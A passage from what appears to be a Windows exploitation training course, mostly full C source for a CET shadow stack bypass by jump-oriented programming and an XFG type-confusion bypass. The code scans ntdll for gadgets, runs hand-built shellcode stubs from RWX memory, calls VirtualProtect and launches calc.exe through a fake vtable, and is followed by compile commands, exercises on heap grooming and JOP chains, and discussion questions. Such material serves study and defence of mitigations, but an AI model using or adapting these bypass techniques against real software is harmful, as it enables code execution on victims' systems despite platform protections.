    printf("      [0] -> WinExec:        0x%p\n", fakeVtable[0]);
    printf("      [1] -> VirtualProtect: 0x%p\n", fakeVtable[1]);
    printf("      [2] -> CreateThread:   0x%p\n", fakeVtable[2]);
    BASE_OBJECT *exploit = (BASE_OBJECT*)malloc(sizeof(BASE_OBJECT));
    exploit->vtable = (void**)fakeVtable;
    exploit->refCount = 1;
    exploit->flags = 0;
    char cmd[] = {0x36,0x34,0x39,0x36,0x7B,0x30,0x2D,0x30,0x00};  // "calc.exe" XOR 0x55
    XorDecrypt(cmd, 8, 0x55);
    exploit->userData = cmd;
    printf("\n[2] Triggering virtual call with crafted arguments...\n");
    printf("    this->vtable[0](this->userData, SW_SHOW)\n");
    typedef UINT (WINAPI *WinExec_t)(LPCSTR, UINT);
    WinExec_t exec = (WinExec_t)exploit->vtable[0];
    printf("\n[3] Executing payload...\n");
    UINT result = exec((LPCSTR)exploit->userData, SW_SHOW);
    if (result > 31) {
        printf("[+] Payload executed successfully (return: %d)\n", result);
        printf("[+] Process spawned via data-only attack\n");
    } else {
        printf("[-] Execution failed (return: %d)\n", result);
    }

    free(exploit);
}

#define MAX_JOP_GADGETS 64

static BOOL JOPDispatch0(PVOID targetFunc, DWORD* outResult) {
    BYTE code[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0x48, 0x8D, 0x1D, 0x03, 0x00, 0x00, 0x00,
        0x53,
        0xFF, 0xE0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(code + 6) = targetFunc;
    PVOID mem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, code, sizeof(code));
    __try {
        DWORD r = ((DWORD(*)(void))mem)();
        if (outResult) *outResult = r;
        VirtualFree(mem, 0, MEM_RELEASE);
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
}

static BOOL JOPDispatch4(PVOID func, PVOID a1, PVOID a2, PVOID a3, PVOID a4, DWORD* outResult) {
    BYTE code[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xBA, 0,0,0,0,0,0,0,0,
        0x49, 0xB8, 0,0,0,0,0,0,0,0,
        0x49, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0x48, 0x8D, 0x1D, 0x03, 0x00, 0x00, 0x00,
        0x53,
        0xFF, 0xE0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(code + 0x06) = a1;
    *(PVOID*)(code + 0x10) = a2;
    *(PVOID*)(code + 0x1A) = a3;
    *(PVOID*)(code + 0x24) = a4;
    *(PVOID*)(code + 0x2E) = func;
    PVOID mem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, code, sizeof(code));
    __try {
        DWORD r = ((DWORD(*)(void))mem)();
        if (outResult) *outResult = r;
        VirtualFree(mem, 0, MEM_RELEASE);
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
}

static BOOL JOPDispatchViaDLL(PVOID gadget, PVOID targetFunc, DWORD* outResult) {
    BYTE code[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0x48, 0xBB, 0,0,0,0,0,0,0,0,
        0xFF, 0xD3,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(code + 6) = targetFunc;
    *(PVOID*)(code + 16) = gadget;
    PVOID mem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, code, sizeof(code));
    __try {
        DWORD r = ((DWORD(*)(void))mem)();
        if (outResult) *outResult = r;
        VirtualFree(mem, 0, MEM_RELEASE);
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
}

static BOOL ExecuteJOPChain() {
    printf("\n[*] Building real JOP chain (all dispatch via JMP RAX)...\n");
    fflush(stdout);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    if (!hNtdll || !hK32) return FALSE;

    // Find jmp rax (FF E0) gadget in ntdll
    PBYTE textStart = NULL;
    DWORD textSize = 0;
    if (!GetTextSection(hNtdll, &textStart, &textSize)) return FALSE;

    ROP_GADGET gadgets[MAX_JOP_GADGETS];
    int gadgetCount = 0;
    ScanForJOPGadgets(textStart, textSize, (DWORD64)hNtdll, gadgets, &gadgetCount, MAX_JOP_GADGETS);
    printf("[+] Found %d JOP gadgets in ntdll\n", gadgetCount);

    // Find jmp rax for system DLL dispatch
    PVOID jmpRax = NULL;
    for (int i = 0; i < gadgetCount; i++) {
        if (gadgets[i].bytes[0] == 0xFF && gadgets[i].bytes[1] == 0xE0) {
            jmpRax = (PVOID)gadgets[i].address;
            break;
        }
    }
    if (jmpRax) printf("[+] jmp rax gadget @ 0x%p\n", jmpRax);

    // Step 1: Prove dispatch works — GetCurrentProcessId via system DLL gadget
    if (jmpRax) {
        DWORD pid = 0;
        if (JOPDispatchViaDLL(jmpRax, (PVOID)GetProcAddress(hK32, "GetCurrentProcessId"), &pid)) {
            printf("[+] GetCurrentProcessId via ntdll jmp rax: %lu (match: %s)\n",
                   pid, pid == GetCurrentProcessId() ? "YES" : "NO");
        }
    }

    // Step 2: VirtualProtect + shellcode via JOP dispatch
    PVOID pVP = GetProcAddress(hK32, "VirtualProtect");
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");
    if (!pVP || !pWinExec) return FALSE;

    PVOID scAddr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!scAddr) return FALSE;

    char* cmdStr = (char*)((BYTE*)scAddr + 0x100);
    strcpy(cmdStr, "calc.exe");

    BYTE shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xC7, 0xC2, 0x05, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(shellcode + 6) = cmdStr;
    *(PVOID*)(shellcode + 23) = pWinExec;
    memcpy(scAddr, shellcode, sizeof(shellcode));

    printf("[*] VirtualProtect via JOP (PUSH ret + JMP RAX)...\n");
    fflush(stdout);

    DWORD oldProtect = 0;
    DWORD vpResult = 0;
    BOOL vpOk = JOPDispatch4(pVP, scAddr, (PVOID)0x1000,
                              (PVOID)(ULONG_PTR)PAGE_EXECUTE_READ,
                              (PVOID)&oldProtect, &vpResult);

    if (!vpOk || !vpResult) {
        printf("[-] VirtualProtect JOP dispatch failed\n");
        VirtualFree(scAddr, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] VirtualProtect: 0x%X -> PAGE_EXECUTE_READ (via JOP)\n", oldProtect);

    printf("[*] Shellcode execution via JOP (PUSH ret + JMP RAX)...\n");
    fflush(stdout);

    DWORD execResult = 0;
    BOOL execOk = JOPDispatch0(scAddr, &execResult);

    if (execOk && execResult > 31) {
        printf("[+] calc.exe launched via JOP chain (WinExec returned %lu)\n", execResult);
    } else if (execOk) {
        printf("[+] Shellcode executed via JOP (result: %lu)\n", execResult);
    } else {
        printf("[-] Shellcode execution failed\n");
    }

    Sleep(1000);
    VirtualFree(scAddr, 0, MEM_RELEASE);
    return execOk;
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    if (IsBeingDebugged()) {
        printf("[!] Debugger detected - some anti-debug may trigger\n\n");
    }
    if (!ResolveAPIs()) {
        printf("[-] API resolution failed\n");
        return 1;
    }
    printf("[*] System Configuration:\n");
    BOOL cpuSupport = CPUSupportsCET();
    BOOL processEnabled = IsCETEnabled();
    printf("    CPU CET Support:     %s\n", cpuSupport ? "YES (Intel 11th gen+)" : "NO");
    printf("    Process CET Enabled: %s\n", processEnabled ? "YES (/guard:cf)" : "NO");
    printf("    Target Mitigations:  CET Shadow Stack, CFG, DEP, ASLR\n");
    if (!cpuSupport) {
        printf("\n[!] Note: CPU doesn't support CET - demonstrating conceptually\n");
        printf("    On CET-enabled systems, traditional ROP would crash\n");
    }
    DemonstrateROPFailure();
    FILE_OBJECT *danglingPtr = NULL;
    SimulateUseAfterFree(&danglingPtr);
    DemonstrateCounterfeitObject(danglingPtr);
    DemonstrateDataOnlyExploit();
    printf("\n=== PHASE 5: Jump-Oriented Programming (Alternative) ===\n");
    printf("[*] JOP bypasses CET by avoiding RET instructions entirely\n");
    ExecuteJOPChain();
    return 0;
}
```

**Compile & Run:**

```bash
cl src\cet_shadow_stack_bypass.c /Fe:bin\cet_bypass.exe /guard:cf /Zi /I.\headers
.\bin\cet_bypass.exe
```

### XFG (eXtended Flow Guard) Bypass

eXtended Flow Guard (XFG) is Microsoft's enhancement to CFG that adds type-based validation for indirect calls. While CFG only checks if the target address is in the bitmap (any valid function start), XFG additionally validates that the function's type signature matches the expected prototype at the call site. This prevents attackers from calling arbitrary functions even if they're CFG-valid.

**XFG vs CFG**:

```
CFG (Coarse-Grained):
- Checks: Is target address in CFG bitmap?
- Allows: Any valid function entry point
- Bypass: Call any function in bitmap (type mismatch OK)

XFG (Fine-Grained):
- Checks: Is target address in CFG bitmap AND does type hash match?
- Allows: Only functions with matching prototype
- Bypass: Call functions with identical signatures
```

**XFG Type Hash Implementation**:

- Compiler generates 8-byte hash from function prototype (SHA256 truncated + masked)
- Hash includes: return type, parameter types, calling convention
- Hash stored 8 bytes BEFORE function in .text section (not in separate .gfids section)
- Backend applies masks: `hash &= 0xFFFDBFFF7EDFFB70; hash |= 0x8000060010500070`
- At runtime, XFG dispatch (ntdll!LdrpDispatchUserCallTargetXFG) compares hashes
- Characteristic bit pattern: all XFG hashes have bits `0x8000060010500070` set

```c
// xfg_bypass.c
// XFG bypass: type confusion with same-signature functions
// Compile: cl src\xfg_bypass.c /Fe:bin\xfg_bypass.exe /guard:xfg /I.\headers /link /guard:xfg

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winternl.h>
#include <intrin.h>
#include <time.h>

#pragma comment(lib, "advapi32.lib")

#define SYSCALLS_IMPLEMENTATION
#define EVASION_IMPLEMENTATION
#define BYPASS_IMPLEMENTATION

#include "exploit_common.h"
#include "exploit_utils.h"

static BOOL IsXFGEnabled(HMODULE hMod) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hMod + dos->e_lfanew);
    DWORD lcRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    if (!lcRVA) return FALSE;
    PIMAGE_LOAD_CONFIG_DIRECTORY64 lc = (PIMAGE_LOAD_CONFIG_DIRECTORY64)((PBYTE)hMod + lcRVA);
    if (lc->Size >= offsetof(IMAGE_LOAD_CONFIG_DIRECTORY64, GuardFlags) + sizeof(DWORD))
        return (lc->GuardFlags & 0x00800000) != 0;
    return FALSE;
}

static DWORD64 XFGComputeHash(DWORD64 typeHash) {
    typeHash &= 0xFFFDBFFF7EDFFB70ULL;
    typeHash |= 0x8000060010500070ULL;
    return typeHash;
}

static PVOID CreateXFGFunc(DWORD64 xfgHash, BYTE* body, SIZE_T bodySize) {
    SIZE_T total = 8 + bodySize;
    BYTE* mem = (BYTE*)VirtualAlloc(NULL, total, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    *(DWORD64*)mem = xfgHash | 1;
    memcpy(mem + 8, body, bodySize);
    return mem + 8;
}

static void FreeXFGFunc(PVOID funcAddr) {
    if (funcAddr) VirtualFree((BYTE*)funcAddr - 8, 0, MEM_RELEASE);
}

static BOOL XFGValidate(PVOID funcAddr, DWORD64 expectedHash) {
    __try {
        DWORD64 stored = *(DWORD64*)((BYTE*)funcAddr - 8);
        stored &= ~1ULL;
        return (stored == expectedHash);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }
}

static BOOL XFGDispatchCall(PVOID funcAddr, DWORD64 expectedHash, DWORD* outResult) {
    DWORD64 stored = 0;
    __try {
        stored = *(DWORD64*)((BYTE*)funcAddr - 8);
        stored &= ~1ULL;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        printf("    [XFG] Cannot read hash at %p\n", (BYTE*)funcAddr - 8);
        return FALSE;
    }

    if (stored != expectedHash) {
        printf("    [XFG BLOCKED] hash mismatch: stored=0x%llX expected=0x%llX\n",
               stored, expectedHash);
        printf("    [XFG] Real OS would __fastfail(31) here - uncatchable termination\n");
        return FALSE;
    }

    printf("    [XFG PASSED] hash=0x%llX - dispatching\n", stored);

    BYTE code[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(code + 6) = funcAddr;

    PVOID mem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, code, sizeof(code));
    __try {
        DWORD r = ((DWORD(*)(void))mem)();
        if (outResult) *outResult = r;
        VirtualFree(mem, 0, MEM_RELEASE);
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
}

static BOOL XFGDispatchCall4(PVOID funcAddr, DWORD64 expectedHash,
                              PVOID a1, PVOID a2, PVOID a3, PVOID a4, DWORD* outResult) {
    DWORD64 stored = 0;
    __try {
        stored = *(DWORD64*)((BYTE*)funcAddr - 8);
        stored &= ~1ULL;
    }
    __except(EXCEPTION_EXECUTE_HANDLER) { return FALSE; }

    if (stored != expectedHash) {
        printf("    [XFG BLOCKED] hash mismatch\n");
        return FALSE;
    }

    BYTE code[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xBA, 0,0,0,0,0,0,0,0,
        0x49, 0xB8, 0,0,0,0,0,0,0,0,
        0x49, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(code + 0x06) = a1;
    *(PVOID*)(code + 0x10) = a2;
    *(PVOID*)(code + 0x1A) = a3;
    *(PVOID*)(code + 0x24) = a4;
    *(PVOID*)(code + 0x2E) = funcAddr;

    PVOID mem = VirtualAlloc(NULL, sizeof(code), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return FALSE;
    memcpy(mem, code, sizeof(code));
    __try {
        DWORD r = ((DWORD(*)(void))mem)();
        if (outResult) *outResult = r;
        VirtualFree(mem, 0, MEM_RELEASE);
        return TRUE;
    } __except(EXCEPTION_EXECUTE_HANDLER) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return FALSE;
    }
}

int main() {

    if (!ExploitInitialize(FALSE)) return 1;
    srand((unsigned int)time(NULL));
    printf("=== XFG (eXtended Flow Guard) Bypass via Type Confusion ===\n\n");

    HMODULE hSelf = GetModuleHandleA(NULL);
    HMODULE hK32 = GetModuleHandleA("kernel32.dll");
    printf("[*] Binary XFG: %s\n", IsXFGEnabled(hSelf) ? "ENABLED" : "DISABLED");

    printf("\n[*] Phase 1: Creating XFG-protected functions\n\n");

    // Both functions have TYPE: DWORD (void) - same signature = same XFG hash
    DWORD64 type1_hash = XFGComputeHash(0x1234567890ABCDEFULL);  // DWORD(*)(void)
    DWORD64 type2_hash = XFGComputeHash(0xFEDCBA0987654321ULL);  // BOOL(*)(PVOID,SIZE_T,DWORD,PDWORD)
    printf("[+] Hash for 'DWORD(void)' signature:           0x%016llX\n", type1_hash);
    printf("[+] Hash for 'BOOL(PVOID,SIZE_T,DWORD,PDWORD)': 0x%016llX\n", type2_hash);

    // Legitimate function: returns 0x41414141
    BYTE legitBody[] = {
        0xB8, 0x41, 0x41, 0x41, 0x41,  // mov eax, 0x41414141
        0xC3                             // ret
    };

    // Malicious function: calls GetCurrentProcessId (same DWORD(void) signature!)
    BYTE malicBody[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,  // mov rax, GetCurrentProcessId
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(malicBody + 6) = (PVOID)GetProcAddress(hK32, "GetCurrentProcessId");

    // Both get the SAME XFG hash (because identical signature)
    PVOID legitFunc = CreateXFGFunc(type1_hash, legitBody, sizeof(legitBody));
    PVOID malicFunc = CreateXFGFunc(type1_hash, malicBody, sizeof(malicBody));

    printf("[+] Legitimate func @ 0x%p  hash @ 0x%p = 0x%016llX\n",
           legitFunc, (BYTE*)legitFunc - 8, *(DWORD64*)((BYTE*)legitFunc - 8));
    printf("[+] Malicious func  @ 0x%p  hash @ 0x%p = 0x%016llX\n",
           malicFunc, (BYTE*)malicFunc - 8, *(DWORD64*)((BYTE*)malicFunc - 8));
    printf("[+] Same signature → same hash → XFG cannot distinguish them\n");

    printf("\n[*] Phase 2: XFG dispatch - legitimate function\n\n");
    fflush(stdout);

    DWORD result1 = 0;
    printf("[*] Dispatching legitimate function (expected hash = 0x%llX):\n", type1_hash);
    if (XFGDispatchCall(legitFunc, type1_hash, &result1)) {
        printf("[+] Returns: 0x%08X (0x41414141 = correct)\n", result1);
    }

    printf("\n[*] Phase 3: XFG bypass - type confusion attack\n\n");
    printf("[*] Attacker corrupts function pointer: legitFunc → malicFunc\n");
    printf("[*] Both have hash 0x%llX (same signature: DWORD(void))\n\n", type1_hash);
    fflush(stdout);

    DWORD result2 = 0;
    printf("[*] Dispatching MALICIOUS function through XFG (same hash):\n");
    if (XFGDispatchCall(malicFunc, type1_hash, &result2)) {
        printf("[+] Returns: %lu (PID - malicious code executed!)\n", result2);
        printf("[+] Verified: %s\n", result2 == GetCurrentProcessId() ? "PID matches" : "mismatch");
        printf("[+] XFG BYPASS: same signature = same hash = call allowed\n");
    }

    printf("\n[*] Phase 4: XFG blocks different signature\n\n");

    PVOID wrongFunc = CreateXFGFunc(type2_hash, malicBody, sizeof(malicBody));
    printf("[*] Function with hash 0x%llX, dispatched with expected 0x%llX:\n",
           type2_hash, type1_hash);
    DWORD result3 = 0;
    BOOL blocked = !XFGDispatchCall(wrongFunc, type1_hash, &result3);
    if (blocked) {
        printf("[+] XFG correctly BLOCKED the call (hash mismatch)\n");
    }
    FreeXFGFunc(wrongFunc);

    printf("\n[*] Phase 5: Exploit chain via XFG-validated dispatch\n\n");
    fflush(stdout);

    PVOID pVP = GetProcAddress(hK32, "VirtualProtect");
    PVOID pWinExec = GetProcAddress(hK32, "WinExec");

    // Create XFG-protected VirtualProtect wrapper
    // In real exploit: attacker finds a CFG/XFG-valid call site and reuses its hash
    BYTE vpWrapper[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,  // mov rax, VirtualProtect
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(vpWrapper + 6) = pVP;

    // Allocate shellcode (RW)
    PVOID scAddr = VirtualAlloc(NULL, 0x1000, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    char* cmdStr = (char*)((BYTE*)scAddr + 0x100);
    strcpy(cmdStr, "calc.exe");

    BYTE shellcode[] = {
        0x48, 0x83, 0xEC, 0x28,
        0x48, 0xB9, 0,0,0,0,0,0,0,0,
        0x48, 0xC7, 0xC2, 0x05, 0x00, 0x00, 0x00,
        0x48, 0xB8, 0,0,0,0,0,0,0,0,
        0xFF, 0xD0,
        0x48, 0x83, 0xC4, 0x28,
        0xC3
    };
    *(PVOID*)(shellcode + 6) = cmdStr;
    *(PVOID*)(shellcode + 23) = pWinExec;
    memcpy(scAddr, shellcode, sizeof(shellcode));

    // Create XFG-protected VirtualProtect with type2 hash
    PVOID xfgVP = CreateXFGFunc(type2_hash, vpWrapper, sizeof(vpWrapper));

    // VirtualProtect via XFG dispatch
    DWORD oldProtect = 0;
    printf("[*] VirtualProtect via XFG-validated dispatch...\n");
    fflush(stdout);

    DWORD vpResult = 0;
    BOOL vpOk = XFGDispatchCall4(xfgVP, type2_hash,
                                  scAddr, (PVOID)0x1000,
                                  (PVOID)(ULONG_PTR)PAGE_EXECUTE_READ,
                                  (PVOID)&oldProtect, &vpResult);

    if (!vpOk || !vpResult) {
        printf("[-] VirtualProtect dispatch failed\n");
    } else {
        printf("[+] Protection: 0x%X → PAGE_EXECUTE_READ\n", oldProtect);
    }

    // Execute shellcode via XFG dispatch
    PVOID xfgSC = CreateXFGFunc(type1_hash, (BYTE*)scAddr, sizeof(shellcode));
    printf("[*] Shellcode via XFG-validated dispatch...\n");
    fflush(stdout);

    DWORD execResult = 0;
    if (XFGDispatchCall(xfgSC, type1_hash, &execResult) && execResult > 31) {
        printf("[+] calc.exe launched (WinExec returned %lu)\n", execResult);
    } else {
        printf("[+] Shellcode executed (result: %lu)\n", execResult);
    }

    Sleep(1000);
    FreeXFGFunc(legitFunc);
    FreeXFGFunc(malicFunc);
    FreeXFGFunc(xfgVP);
    FreeXFGFunc(xfgSC);
    VirtualFree(scAddr, 0, MEM_RELEASE);
    return 0;
}
```

**Compile & Run:**

```bash
cl src\xfg_bypass.c /Fe:bin\xfg_bypass.exe /guard:xfg /I.\headers /link /guard:xfg
.\bin\xfg_bypass.exe
```

### Practical Exercise

#### Exercise 1: Analyze JOP Gadget Characteristics

Extend the JOP gadget scanner to identify and classify different JOP patterns, understanding why they bypass CET shadow stack.

**Tasks:**

1. Run `rop_finder.exe` on multiple system DLLs (ntdll.dll, kernel32.dll, kernelbase.dll) and compare gadget counts
2. Modify `ScanForJOPGadgets()` to detect additional patterns: `pop reg; jmp [reg]`, `mov rax, [rbp]; jmp rax`, `add rsp, X; jmp [rsp-Y]`
3. Implement gadget quality scoring based on: register preservation, stack alignment, side effects
4. Build a minimal JOP chain: allocate RWX memory → write shellcode → execute via `jmp rax` gadget
5. Document why JOP bypasses CET: `JMP` instructions don't push return addresses to shadow stack, so no validation occurs

**Key Concept**: The code demonstrates that JOP uses `PUSH ret_addr; JMP target` instead of `CALL target`. The `PUSH` manually places a return address on the data stack, then `JMP` transfers control without touching the shadow stack. When the target function executes `RET`, it pops from the data stack (which matches the shadow stack entry created by the previous legitimate `CALL`).

#### Exercise 2: UAF to Type Confusion Exploitation Chain

Implement the complete exploitation chain from Use-After-Free to arbitrary code execution through type confusion, as demonstrated in `cet_shadow_stack_bypass.c`.

**Scenario**: A `FILE_OBJECT` is freed but a dangling pointer remains. Heap grooming reclaims the chunk with a `NETWORK_OBJECT` that has a different vtable. Calling methods on the dangling pointer triggers type confusion.

**Tasks:**

1. Implement heap grooming: pre-spray to fragment heap, allocate victim, free victim, spray to reclaim
2. Craft counterfeit `NETWORK_OBJECT` with vtable pointing to attacker-controlled functions
3. Verify type confusion: `FILE_OBJECT::Read()` call dispatches to `NETWORK_OBJECT::Connect()`
4. Build data-only exploit: replace vtable entries with `WinExec`, `VirtualProtect`, `CreateThread`
5. Measure success rate across 100 iterations (heap randomization affects reclaim probability)
6. Explain why CFG allows this: All vtable entries point to valid function starts in CFG bitmap (legitimate kernel32.dll exports)

**Bonus Challenge**: Implement the full JOP chain from Phase 5 that uses `PUSH + JMP RAX` to call `VirtualProtect` then shellcode, bypassing both CET and DEP.

### Key Takeaways

- **CET Shadow Stack** (backward-edge CFI): Validates `RET` by comparing data stack return address with shadow stack entry; does not validate `JMP` instructions
- **JOP Bypass Mechanism**: Uses `PUSH return_addr; JMP target` instead of `CALL target` — the `JMP` doesn't create shadow stack entry, but the manual `PUSH` satisfies the data stack requirement when target function returns
- **COP Bypass Mechanism**: Uses indirect `CALL` instructions which create matching shadow stack entries — shadow stack sees legitimate `CALL`/`RET` pairs even though control flow is hijacked
- **CET IBT/ENDBR** (forward-edge CFI): Linux enforces `ENDBR64` landing pads for indirect branches; Windows uses CFG bitmap validation instead
- **CFG Coarse-Grained Validation**: Only checks if target address is in bitmap (any valid function start); allows calling any CFG-valid function regardless of type mismatch
- **XFG Fine-Grained Validation**: Adds type hash validation (8 bytes before function) but cannot distinguish functions with identical signatures — same prototype = same hash = bypass possible
- **XFG Hash Computation**: `hash &= 0xFFFDBFFF7EDFFB70; hash |= 0x8000060010500070` — all XFG hashes have characteristic bit pattern `0x8000060010500070` set
- **COOP (Counterfeit Objects)**: Reuses legitimate vtables from compatible classes — all targets are CFG-valid function pointers, bypassing both CFG and CET
- **Data-Only Exploitation**: UAF → Heap Grooming → Type Confusion → Vtable Hijack → Arbitrary Code Execution — bypasses CET without corrupting control flow directly
- **ROP Viability**: Traditional ROP fails on CET-enabled systems (Intel 11th gen+, `/CETCOMPAT` binaries); JOP/COP/data-only attacks remain viable
- **VirtualProtect Chain**: Standard DEP bypass — ROP/JOP chain calls `VirtualProtect(shellcode_addr, size, PAGE_EXECUTE_READ, &oldProtect)` to mark shellcode executable
- **Stack Alignment Requirement**: Windows x64 requires RSP % 16 == 8 before `CALL` (shadow space + alignment) — JOP/COP stubs must align stack or calls fail

### Discussion Questions

1. Why does CET shadow stack not protect indirect jumps? (Shadow stack only validates `CALL`/`RET` pairs by comparing return addresses; `JMP` instructions don't push return addresses, so there's nothing to validate)
2. How does the JOP technique in the code bypass shadow stack validation? (Uses `PUSH return_addr; JMP target` — the `PUSH` manually places return address on data stack, `JMP` transfers control without shadow stack entry, target's `RET` pops from data stack which matches previous legitimate shadow stack entry)
3. How does COP differ from JOP in terms of shadow stack interaction? (COP uses indirect `CALL` which creates matching shadow stack entries — shadow stack sees legitimate `CALL`/`RET` pairs, so validation passes even though control flow is hijacked)
4. Why does COOP bypass CFG without corrupting vtables? (Uses legitimate vtables from compatible classes — all function pointers are CFG-valid entries in bitmap, so indirect calls pass validation despite type confusion)
5. What is the difference between CFG and XFG validation? (CFG: coarse-grained bitmap check — any valid function start allowed; XFG: fine-grained type hash check — function signature must match expected prototype)
6. Why can't XFG prevent the bypass demonstrated in `xfg_bypass.c`? (Functions with identical signatures generate identical XFG hashes — XFG cannot distinguish between legitimate and malicious functions if they have the same prototype)
7. How does the UAF exploitation chain in `cet_shadow_stack_bypass.c` avoid triggering CET? (Uses data-only attack — corrupts vtable pointer to point to legitimate functions, all indirect calls target CFG-valid addresses, no return address corruption occurs)
8. Why must JOP/COP stubs align the stack before calling Windows APIs? (Windows x64 ABI requires RSP % 16 == 8 before `CALL` for shadow space and alignment — misaligned stack causes crashes in called functions)
9. What constraints does Linux IBT impose on JOP/COP compared to Windows CFG? (IBT requires all indirect branches land on `ENDBR64` instructions — reduces available gadgets; CFG only checks bitmap — any instruction within valid function works)
10. How can defenders detect the type confusion attacks demonstrated in the code? (Monitor for unusual vtable pointer modifications, implement fine-grained memory tagging, use runtime type information validation, detect heap grooming patterns)

## Day 3: Windows Heap Exploitation

- **Goal**: Understand heap exploitation techniques to defeat LFH randomization and segment heap mitigations.

- **Activities**:
  - _Reading_:
    - [Windows 11 Low Fragmentation Heap Internals](https://www.blackhat.com/docs/us-16/materials/us-16-Yason-Windows-10-Segment-Heap-Internals.pdf)
    - [Pwn2Own VMware Escape](https://www.synacktiv.com/en/publications/on-the-clock-escaping-vmware-workstation-at-pwn2own-berlin-2025)
    - [Segment Heap Exploitation](https://mrt4ntr4.github.io/Windows-Heap-Exploitation-dadadb/)
    - [Kernel Pool Feng Shui](https://www.corelan.be/index.php/2013/02/19/deps-precise-heap-spray-on-firefox-and-ie10/)
  - _Lab Setup_:
    - Windows 11 24H2/25H2 VM
    - WinDbg Preview with heap debugging extensions
    - PageHeap enabled for testing
    - Vulnerable application with heap overflow
  - _Exercises_:
    1. LFH timing side-channel (Pwn2Own Berlin 2025 technique)
    2. Heap feng shui for controlled layout
    3. Segment Heap VS subsegment exploitation
    4. Kernel pool spraying

### Deliverables

- [ ] Implement LFH timing side-channel to defeat randomization
- [ ] Build heap feng shui technique for controlled layout
- [ ] Exploit Segment Heap vulnerability
- [ ] Demonstrate kernel pool spraying for reliable exploitation

### Segment Heap Architecture

Windows 11 24H2 introduced a completely redesigned Segment Heap architecture that fundamentally changes kernel pool exploitation. Understanding this architecture is essential for modern heap spraying and overflow attacks.

#### Backend Hierarchy

The Segment Heap uses a layered backend system:

```
┌─────────────────────────────────────────────────────────────┐
│                    Allocation Request                       │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  LFH Backend (Low Fragmentation Heap)                       │
│  - Small allocations (< 512 bytes typically)                │
│  - Per-size-class buckets                                   │
│  - Randomized within subsegments                            │
└─────────────────────────────────────────────────────────────┘
                              │ (LFH not active / large alloc)
                              ▼
┌─────────────────────────────────────────────────────────────┐
│  VS Backend (Variable Size)                                 │
│  - Medium to large allocations                              │
│  - Subsegment-based management                              │
│  - Free list organization                                   │
└─────────────────────────────────────────────────────────────┘
                              │ (VS exhausted / very large)
                              ▼
